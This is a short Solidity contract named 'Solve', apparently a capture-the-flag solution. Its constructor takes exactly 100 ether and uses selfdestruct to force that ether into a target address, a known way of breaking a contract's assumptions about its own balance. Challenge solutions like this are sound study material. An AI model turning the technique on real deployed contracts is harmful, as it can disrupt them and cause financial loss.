// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;


contract Solve {

  constructor(address payable target_) payable {
    require(msg.value == 100 ether, "Not enough ETH");
    selfdestruct(target_);
  }

  receive() external payable {}
}